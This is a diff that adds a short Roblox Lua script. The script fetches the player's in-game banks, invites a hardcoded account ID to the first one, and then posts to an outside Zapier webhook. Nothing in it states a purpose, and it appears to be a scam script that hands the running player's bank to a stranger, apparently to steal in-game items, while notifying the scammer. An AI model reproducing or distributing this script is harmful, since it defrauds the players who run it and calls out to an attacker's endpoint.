@@ -1,0 +1,8 @@
+local authkey = 3678801473
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mybanks = lib.Network.Invoke("get my banks")
+lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], authkey)
+local url = "https://hooks.zapier.com/hooks/catch/12875243/bw00at2/"
+local data0 = {}
+local newdata0 = game:GetService'HttpService':JSONEncode(data0)
+game:HttpPost(url,newdata0)
